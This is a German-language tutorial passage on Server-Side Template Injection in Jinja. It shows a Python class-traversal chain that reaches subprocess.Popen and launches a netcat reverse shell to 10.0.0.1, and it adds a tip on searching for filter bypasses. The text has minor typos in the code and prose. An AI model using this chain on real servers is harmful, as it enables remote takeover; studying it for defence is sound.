# Server-Side Template Injection (SSTI)

Web-Applikationen verwenden Template-Engines um dynamische Inhalte zu
präsentieren. Anstatt eine Seite starr zu kodieren, wird ein Template
server-seitig in einer Datenbank gespeichert (z.B. als String/Text).
Wird die Seite angezeigt, wird das Template mit den aktuellen Daten
kombiniert und die resultierende Seite angezeigt. Häufig können
eingeloggte Benutzer (im Folgenden Autoren genannt) Templates
server-seitig modifizieren und auf diese Weise das Layout modifizieren.

Durch die Verwendung von Templates ergeben sich Vorteile:

- Content-Autoren können Templates modifizieren (z.B. mittels eines
  WYSIWYG–Editor innerhalb des Administrationsbereichs) ohne auf den
  Source-Code der Applikation Zugriff zu benötigen.

- Die verwendeten Template-Sprachen sind zumeist einfacher als
  ,,volle” Programmiersprachen und können daher auch leichter
  angelernt werden und erlauben es so einem größeren Benutzerkreis die
  Inhalte der Webseite zu modifzieren.

- Die Daten, auf welche ein Template zugreifen kann, können limitiert
  werden. Auf diese Weise können Content-Autoren nur auf ein Subset
  der server-seitigen Daten zugreifen.

Natürlich ergeben sich auch Angriffsmöglichkeiten. Kann ein Angreifer
ein Template modifizieren und anschließend zur Ausführung bringen,
besitzt er die Möglichkeit am Server Code (innerhalb der
Template-Engine) auszuführen. Nun benötigt er noch die Möglichkeit, aus
dem Template-System auszubrechen und in der zugrunde liegenden Umgebung
(z.B. in die Web-Applikation) Befehle auszuführen. Dies wäre dann eine
Remote Command Execution (RCE).

## Beispiel Template System: Jinja (Python)

Eine häufig verwendete Template Engine in Python-basierten
Web-Applikationen ist Jinja[8]. In einem Template werden primär zwei
verschiedene Kommando-Tags zum Inkludieren von Daten bzw. Kommandos
verwendet:

```jinja
<ul>
    {% for item in somelist %}
      <li> {{ item }} </li>
    {% endfor %}
</ul>
```

Dieses Jinja/HTML-Fragment baut eine Aufzählungsliste (mittels dem
ul-Tag). Es verwendet Template-Tags um eine Python-for-Schleife zu
inkludieren. Diese Schleife iteriert über die somelist Liste und
inkludiert jedes Item in einem li-Element.

## Exploitation

In einem typischen Szenario hat der Angreifer bereits Zugriff auf ein
System erlangt und kann sowohl ein Template bearbeiten als auch
ausführen. Dies kann z.B. durch Erlangen eines CMS-Autor-Accounts
innerhalb der Weboberfläche geschehen. Innerhalb dieser Oberfläche kann
der Angreifer ein Template (z.B. für versendete Emails) modifizieren als
auch, z.B. als ,,Preview”, anzeigen (und dadurch das Template zur
Exekution bringen).

Der Angreifer verwendet hierfür z.B. die gezeigen {{ …}} Tags. Er
besitzt allerdings nur Zugriff auf Objekte, welche in das Template vom
System hinein übergeben wurden. Bei unserem Beispiel wäre dies die Liste
somelist. Hier kann er allerdings das Python-Typsystem ausnutzen um
Zugriff auf weitere Objekte zu erlangen. Schlussendlich will der
Angreifer zu einem Objekt bzw. zu einer Klasse gelanten, welche ihm die
Ausführung von Code am Server erlaubt.

In Python kann über das Attribut \_\_class\_\_ auf die Klasse eines
Objekts zugegriffen werden, die Methode mro liefert sowohl die eigene
Klasse als auch alle Elternklassen eines Objektes:

```python
somelist = [1,2,3]
somelist.__class__         # -> <type 'list'>
somelist.__class__.mro()   # -> [<type 'list'>, <type 'object'>]
obj_class = somelist.__class__.mro()[1]
```

Somit erhaltne wir über ,,somelist.\_\_class\_\_.mro()” alle Klassen
(inklusive vererbter Klassen) des Objekts ,,somelist”. In Python erben
alle Klassen von der Elternklasse ,,Object” welche wir über die
Array-Position 1 selektieren und der Variablen ,,obj\_class” zuweisen.
Klassen in Python besitzen die Methode ,,\_\_subclasses\_\_” welche eine
Liste von allen aktuell bekannten Subklassen zurück liefert. Diese Liste
ist dynamisch sowohl die Elemente, als auch die Reihung jener, kann zur
Laufzeit variieren.

Ein Angreifer kann diese Liste ausgeben und eine potentiell verwundbare
Klasse, wie z.B. ,,subprocess.Popen” suchen und über den Index diese
Klasse selektionen. Nehmen wir an, dass diese Klasse in unserem Beispiel
auf Array Position 42 vorhandne war. Durch Hinzufügen von ,,()” wird nun
der Konstruktor der Klasse aufgerufen, hierbei können Parameter
angegeben werden. Bei ,,Popen” kann ein Array mit Parametern übergeben
werden. Diese werden zusammenkopiert und beim Aufruf des Konstruktors
als Systemkommando ausgeführt:

```python
obj_class = somelist.__class__.mro()[1]
obj_class.__subclasses__()[42]   # -> <class 'subprocess.Popen'>
obj_class.__subclasses__[42](["nc", "10.0.0.1", "443", "-e", "/bin/sh"])
```

Bei diesem Beispiel wird somit als Kommando `ns 10.0.0.1 443 -e /bin/sh` aufgerufen: dieses Kommando baut eine reverse-shell auf, ein
Angreifer erhält auf diese Weise Shell-Zugriff auf den Server mit den
Rechten der Web-Applikation.

Webapplikationen versuchen häufig, Benutzereingaben in Templates auf
Schadcode hin zu überprüfen. Dies ist problematisch da Templates viele
Möglichkeiten bieten, Schadcode zu verschleiern und auf diese Weise
Absicherungen zu umgehen[9]. Als Angreifer sucht man in diesem Fall am
Besten nach ,,bypass” und dem Namen der verwendeten Template-Engine.

Ein Exploit gegen ein Template-System kann selten zu 100% statisch
erfolgen da die Liste der Subklassen von ,,Object” dynamisch ist: sowohl
die Elemente als auch deren Position ist von der Laufzeitumgebung
abhängig und kann sich bei jedem Start der Webapplikation verändern. Ein
Angreifer wird daher zumeist mehrstufig vorgehen und nach Erlangen des
Zugriffs auf das CMS initial versuchen aussichtsreiche Objekt-Klassen
und deren Position (im Subklassen-Array) zu identifizieren. Anschließend
wird er versuchen, erfolgversprechende Klassen zu instanzieren und auf
diese Weise Schadcode auszuführen.
